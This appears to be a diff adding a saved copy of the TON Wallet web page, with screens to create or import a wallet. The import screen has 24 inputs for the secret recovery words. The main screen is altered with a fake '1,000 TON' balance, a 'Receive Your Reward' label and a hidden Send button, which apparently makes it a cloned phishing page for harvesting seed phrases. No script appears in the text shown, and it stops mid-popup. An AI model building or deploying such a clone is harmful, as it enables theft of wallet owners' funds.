@@ -1,0 +1,686 @@
+<!DOCTYPE html>
+<!-- saved from url=(0023)https://wallet.ton.org/ -->
+<html lang="en" translate="no"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta http-equiv="Content-Security-Policy" content="default-src &#39;none&#39;; script-src &#39;self&#39;; style-src &#39;self&#39;; font-src &#39;self&#39;; img-src &#39;self&#39; data: https://nft.ton.diamonds/; manifest-src &#39;self&#39;; connect-src &#39;self&#39; https://toncenter.com/api/ https://testnet.toncenter.com/api/ https://stage.toncenter.com/api/ https://stage-testnet.toncenter.com/api/ https://ton.diamonds/api/wallet/diamond_nfts">
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,minimum-scale=1,user-scalable=no,viewport-fit=cover">
+
+    <title>TON Wallet</title>
+
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="google" content="notranslate">
+
+    <meta name="description" content="Set up your own TON Wallet on The Open Network">
+    <meta name="image" content="assets/favicon/512x512.png">
+
+    <meta itemprop="name" content="TON Wallet">
+    <meta itemprop="description" content="Set up your own TON Wallet on The Open Network">
+    <meta itemprop="image" content="assets/favicon/512x512.png">
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:title" content="TON Wallet">
+    <meta name="twitter:description" content="Set up your own TON Wallet on The Open Network">
+    <meta name="og:title" content="TON Wallet">
+    <meta name="og:description" content="Set up your own TON Wallet on The Open Network">
+    <meta name="og:type" content="website">
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://wallet.ton.org/assets/favicon/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://wallet.ton.org/assets/favicon/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="192x192" href="https://wallet.ton.org/assets/favicon/192x192.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://wallet.ton.org/assets/favicon/favicon-16x16.png">
+    <link rel="manifest" href="https://wallet.ton.org/assets/favicon/site.webmanifest">
+    <link rel="mask-icon" href="https://wallet.ton.org/assets/favicon/safari-pinned-tab.svg" color="#0088cc">
+    <link rel="shortcut icon" href="https://wallet.ton.org/assets/favicon/favicon.ico">
+    <meta name="apple-mobile-web-app-title" content="TON Wallet">
+    <meta name="application-name" content="TON Wallet">
+    <meta name="msapplication-TileColor" content="#ffffff">
+    <meta name="msapplication-TileImage" content="assets/favicon/mstile-144x144.png">
+    <meta name="msapplication-config" content="assets/favicon/browserconfig.xml">
+    <meta name="theme-color" content="#ffffff">
+
+    <link rel="stylesheet" href="./TONWallet_files/main.css">
+</head>
+<body class="">
+
+<div class="body-container">
+
+    <!-- Start Screen -->
+
+    <div id="start" class="screen visibility-hidden faded-hide">
+        <div class="middle">
+            <div class="middle-content">
+                <tgs-player data-name="start" src="assets/lottie/intro.tgs" width="120" height="120" class="screen-lottie">
+                <canvas width="120" height="120" style="width: 120px; height: 120px;"></canvas></tgs-player>
+
+                <div class="screen-title">TON Wallet</div>
+                <div class="screen-text">
+                    TON wallet allows you to make fast and<br>
+                    secure blockchain-based payments<br>
+                    without intermediaries.
+                </div>
+
+                <div class="mt-95">
+                    <button id="start_createBtn" class="btn-blue screen-btn">Create My Wallet</button>
+                </div>
+                <div class="mt-20">
+                    <button id="start_importBtn" class="btn-lite font-weight-normal">Import existing wallet
+                    </button>
+                </div>
+                <div class="mt-10">
+                    <button id="start_importLedgerHidBtn" class="btn-lite font-weight-normal">Connect Ledger
+                    </button>
+                </div>
+
+        <!--            <div class="mt-10">-->
+        <!--                <button id="start_importLedgerBleBtn" class="btn-lite font-weight-normal">Connect Ledger via Bluetooth-->
+        <!--                </button>-->
+        <!--            </div>-->
+            </div>
+        </div>
+    </div>
+
+    <!-- Import Screen -->
+
+    <div id="import" class="screen text-align-center visibility-hidden faded-hide">
+        <button id="import_backBtn" class="btn-back"></button>
+        <div class="middle">
+            <div class="middle-content">
+
+                <div class="screen-title mt-80">24 Secret Words</div>
+                <div class="screen-text mb-10">
+                    Please restore access to your <b>non-hardware</b> wallet by<br>
+                    entering the 24 secret words you wrote<br>
+                    down when creating the wallet.
+                </div>
+
+                <button id="import_alertBtn" class="btn-lite">I don't have them</button>
+
+                <div id="importWords">
+
+                <div class="word-item"><span class="word-num">1.</span><input id="importsInput0" type="text" tabindex="1" autocomplete="off"></div><div class="word-item"><span class="word-num">13.</span><input id="importsInput12" type="text" tabindex="13" autocomplete="off"></div><div class="word-item"><span class="word-num">2.</span><input id="importsInput1" type="text" tabindex="2" autocomplete="off"></div><div class="word-item"><span class="word-num">14.</span><input id="importsInput13" type="text" tabindex="14" autocomplete="off"></div><div class="word-item"><span class="word-num">3.</span><input id="importsInput2" type="text" tabindex="3" autocomplete="off"></div><div class="word-item"><span class="word-num">15.</span><input id="importsInput14" type="text" tabindex="15" autocomplete="off"></div><div class="word-item"><span class="word-num">4.</span><input id="importsInput3" type="text" tabindex="4" autocomplete="off"></div><div class="word-item"><span class="word-num">16.</span><input id="importsInput15" type="text" tabindex="16" autocomplete="off"></div><div class="word-item"><span class="word-num">5.</span><input id="importsInput4" type="text" tabindex="5" autocomplete="off"></div><div class="word-item"><span class="word-num">17.</span><input id="importsInput16" type="text" tabindex="17" autocomplete="off"></div><div class="word-item"><span class="word-num">6.</span><input id="importsInput5" type="text" tabindex="6" autocomplete="off"></div><div class="word-item"><span class="word-num">18.</span><input id="importsInput17" type="text" tabindex="18" autocomplete="off"></div><div class="word-item"><span class="word-num">7.</span><input id="importsInput6" type="text" tabindex="7" autocomplete="off"></div><div class="word-item"><span class="word-num">19.</span><input id="importsInput18" type="text" tabindex="19" autocomplete="off"></div><div class="word-item"><span class="word-num">8.</span><input id="importsInput7" type="text" tabindex="8" autocomplete="off"></div><div class="word-item"><span class="word-num">20.</span><input id="importsInput19" type="text" tabindex="20" autocomplete="off"></div><div class="word-item"><span class="word-num">9.</span><input id="importsInput8" type="text" tabindex="9" autocomplete="off"></div><div class="word-item"><span class="word-num">21.</span><input id="importsInput20" type="text" tabindex="21" autocomplete="off"></div><div class="word-item"><span class="word-num">10.</span><input id="importsInput9" type="text" tabindex="10" autocomplete="off"></div><div class="word-item"><span class="word-num">22.</span><input id="importsInput21" type="text" tabindex="22" autocomplete="off"></div><div class="word-item"><span class="word-num">11.</span><input id="importsInput10" type="text" tabindex="11" autocomplete="off"></div><div class="word-item"><span class="word-num">23.</span><input id="importsInput22" type="text" tabindex="23" autocomplete="off"></div><div class="word-item"><span class="word-num">12.</span><input id="importsInput11" type="text" tabindex="12" autocomplete="off"></div><div class="word-item"><span class="word-num">24.</span><input id="importsInput23" type="text" tabindex="24" autocomplete="off"></div></div>
+
+                <div id="wordsPopup" class="display-none" style="display: none;">
+                </div>
+
+                <div class="clear-both">
+                    <button id="import_continueBtn" class="btn-blue screen-btn mt-30 mb-20">
+                        Continue
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Created Screen -->
+
+    <div id="created" class="screen visibility-hidden faded-hide">
+        <div class="middle">
+            <div class="middle-content">
+                <tgs-player data-name="created" src="assets/lottie/created.tgs" width="120" height="120" class="screen-lottie">
+                <canvas width="120" height="120" style="width: 120px; height: 120px;"></canvas></tgs-player>
+
+                <div class="screen-title">Congratulations</div>
+
+                <div class="screen-text">
+                    Your TON wallet has just been created.<br>
+                    Only you control it.
+                </div>
+
+                <div class="screen-text">
+                    To be able to always have access to it,<br>
+                    please set up a secure password and write<br>
+                    down secret words.
+                </div>
+
+                <div>
+                    <button id="createdContinueButton" class="btn-blue screen-btn mt-18 mb-20">
+                        Continue
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Backup Screen -->
+
+    <div id="backup" class="screen text-align-center visibility-hidden faded-hide">
+        <div class="middle">
+            <div class="middle-content">
+                <tgs-player data-name="backup" src="assets/lottie/paper.tgs" width="120" height="120" class="screen-lottie mt-30">
+                <canvas width="120" height="120" style="width: 120px; height: 120px;"></canvas></tgs-player>
+
+                <div class="screen-title">24 secret words</div>
+
+                <div class="screen-text">
+                    Write down these 24 words in the correct<br>
+                    order and store them in secret place.
+                </div>
+
+                <div class="screen-text">
+                    Use these secret words to restore access to<br>
+                    your wallet if you lose your password or<br>
+                    access to this device.
+                </div>
+
+                <div id="createWords" class="mt-10"></div>
+
+                <div class="clear-both">
+                    <button id="backup_continueBtn" class="btn-blue screen-btn mt-26 mb-20">
+                        Continue
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Words Confirm Screen -->
+
+    <div id="wordsConfirm" class="screen text-align-center visibility-hidden faded-hide">
+        <button id="wordsConfirm_backBtn" class="btn-back"></button>
+        <div class="middle">
+            <div class="middle-content">
+
+                <tgs-player data-name="wordsConfirm" src="assets/lottie/confirm.tgs" width="120" height="120" class="screen-lottie mt-30">
+                <canvas width="120" height="120" style="width: 120px; height: 120px;"></canvas></tgs-player>
+
+                <div class="screen-title">Test Time!</div>
+
+                <div class="screen-text">
+                    Now let's check that you wrote your secret<br>words correctly.<br>
+                </div>
+
+                <div id="confirmWordsNums" class="screen-text">
+                    Please enter the words <span>6</span>, <span>14</span> and <span>22</span> below:
+                </div>
+
+                <div id="confirmWords">
+                <div class="word-item"><span class="word-num">6.</span><input id="confirmInput0" type="text" tabindex="1" autocomplete="off" data-word="" data-index="5"></div><div class="word-item"><span class="word-num">14.</span><input id="confirmInput1" type="text" tabindex="2" autocomplete="off" data-word="" data-index="13"></div><div class="word-item"><span class="word-num">22.</span><input id="confirmInput2" type="text" tabindex="3" autocomplete="off" data-word="" data-index="21"></div></div>
+
+                <div id="wordsConfirmPopup" class="display-none" style="display: none; left: 581px; top: 468px;"><div class="words-popup-item selected">nut</div></div>
+
+                <div class="clear-both">
+                    <button id="wordsConfirm_continueBtn" class="btn-blue screen-btn mt-26 mb-20">
+                        Continue
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Create Password Screen -->
+
+    <div id="createPassword" class="screen visibility-hidden faded-hide">
+        <div class="middle">
+            <div class="middle-content">
+                <tgs-player data-name="createPassword" src="assets/lottie/lock.tgs" width="120" height="120" class="screen-lottie">
+                <canvas width="120" height="120" style="width: 120px; height: 120px;"></canvas></tgs-player>
+
+                <div class="screen-title">Secure Password</div>
+
+                <div class="screen-text">
+                    Please choose a secure password<br>
+                    for confirming your payments
+                </div>
+
+                <div class="mt-54">
+                    <input id="createPassword_input" placeholder="Enter your password" type="password">
+                </div>
+                <div>
+                    <input id="createPassword_repeatInput" placeholder="Repeat your password" type="password">
+                </div>
+
+                <div>
+                    <button id="createPassword_continueBtn" class="btn-blue screen-btn mt-38 mb-20">
+                        Continue
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Ready To Go Screen -->
+
+    <div id="readyToGo" class="screen visibility-hidden faded-hide">
+        <div class="middle">
+            <div class="middle-content">
+                <tgs-player data-name="readyToGo" src="assets/lottie/done.tgs" width="120" height="120" class="screen-lottie">
+                <canvas width="120" height="120" style="width: 120px; height: 120px;"></canvas></tgs-player>
+
+                <div class="screen-title">Ready to go!</div>
+
+                <div class="screen-text">
+                    You're all set. Now you have a wallet that<br>
+                    only you control - directly, without<br>
+                    middlemen or bankers.
+                </div>
+
+                <div>
+                    <button id="readyToGo_continueBtn" class="btn-blue screen-btn mt-170 mb-20">
+                        View My Wallet
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Main Screen -->
+
+    <div id="main" class="screen visibility-hidden faded-show">
+        <div class="head">
+            <div class="head-row">
+                <button id="main_refreshBtn" class="btn-round bg-refresh"></button>
+
+                <div id="updateLabel">Updated Receive Your Reward</div>
+
+                <button id="main_settingsButton" class="btn-round bg-menu"></button>
+            </div>
+
+            <div class="balance-container">
+                <div id="balance"><span>1,000 </span><span style="font-size: 24px;"> TON</span></div>
+                <tgs-player data-name="symbol" src="assets/lottie/diamond.tgs" width="32" height="32" class="balance-symbol" style="display: block;">
+                <canvas width="32" height="32" style="width: 32px; height: 32px;"></canvas></tgs-player>
+                <div class="balance-diamond-container" style="display: none;">
+                    <div id="diamond" style="display: none;"></div>
+                </div>
+            </div>
+            <div class="your-balance">Your mainnet balance</div>
+
+<!--            <button id="main_buyBtn" class="btn-blue">-->
+<!--                <div class="btn-icon bg-down-left"></div>-->
+<!--                Buy-->
+<!--            </button>-->
+
+            <button id="main_receiveBtn" class="btn-blue">
+                <div class="btn-icon bg-down-left"></div>
+                Receive
+            </button>
+
+            <button id="sendButton" class="btn-blue display-none" style="display: none;">
+                <div class="btn-icon bg-down-left rotate-180"></div>
+                Send
+            </button>
+        </div>
+
+        <div id="transactionsContainer">
+            <div id="transactionsList"></div>
+            <div id="walletCreated" class="display-none" style="display: block;">
+                <tgs-player data-name="main" width="150" height="150" src="assets/lottie/empty.tgs">
+                <canvas width="150" height="150" style="width: 150px; height: 150px;"></canvas></tgs-player>
+                <div>Wallet Created</div>
+            </div>
+        </div>
+
+    </div>
+
+    <!-- Modal -->
+
+    <div id="modal" class="visibility-hidden faded-show"></div>
+
+    <!-- Menu Dropdown -->
+
+    <div id="menuDropdown" class="visibility-hidden faded-hide">
+        <div id="menu_extension_chrome" class="dropdown-item">Chrome Extension</div>
+        <div id="menu_extension_firefox" class="dropdown-item">Firefox Add-on</div>
+        <div id="menu_about" class="dropdown-item">About</div>
+        <div id="menu_magic" class="dropdown-item">TON Magic <div class="dropdown-toggle"></div></div>
+        <div id="menu_telegram" class="dropdown-item">Open Telegram Web »</div>
+        <div id="menu_proxy" class="dropdown-item">TON Proxy <div class="dropdown-toggle"></div></div>
+        <div id="menu_changePassword" class="dropdown-item" style="display: block;">Change password</div>
+        <div id="menu_backupWallet" class="dropdown-item" style="display: block;">Back up wallet</div>
+        <div id="menu_delete" class="dropdown-item">Log Out</div>
+    </div>
+
+    <!-- Alert Popup-->
+
+    <div id="alert" class="popup visibility-hidden faded-hide">
+        <div class="popup-title"></div>
+        <div class="popup-black-text"></div>
+        <div class="popup-footer"></div>
+    </div>
+
+    <!-- Receive Popup-->
+
+    <div id="receive" class="popup visibility-hidden faded-hide">
+        <div class="popup-title">Receive TON</div>
+        <div class="popup-text">Share this address to receive TON.
+        </div>
+
+        <div class="qr-container">
+            <div id="qr" title="ton://transfer/UQDjHfZ0emMjIXs2oemkcUEJS1HyQc8dpDv8iKC2l_9PZgQc"><canvas width="198" height="198" style="width: 185px; height: 185px; display: none;"></canvas><img alt="Scan me!" crossorigin="*" src="data:image/png;base64,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" style="display: inline;"></div>
+        </div>
+
+        <div class="my-addr addr">UQDjHfZ0emMjIXs2oemkcUEJ<wbr>S1HyQc8dpDv8iKC2l_9PZgQc</div>
+
+        <button id="receive_showAddressOnDeviceBtn" class="btn-lite btn-lite-first" style="display: none;">Show Address on Device</button>
+
+        <button id="receive_invoiceBtn" class="btn-lite">Create Invoice</button>
+
+        <button id="receive_shareBtn" class="btn-blue">Share Wallet Address</button>
+
+        <button id="receive_closeBtn" class="popup-close-btn"></button>
+    </div>
+
+    <!-- Invoice Popup -->
+
+    <div id="invoice" class="popup visibility-hidden faded-hide">
+        <div class="popup-title">Create Invoice</div>
+
+        <div>
+            <div class="input-label">Amount</div>
+        </div>
+
+        <input id="invoice_amountInput" type="number" placeholder="Amount in TON you expect to receive">
+        <input id="invoice_commentInput" type="text" placeholder="Comment (optional)">
+
+        <div class="popup-grey-text">
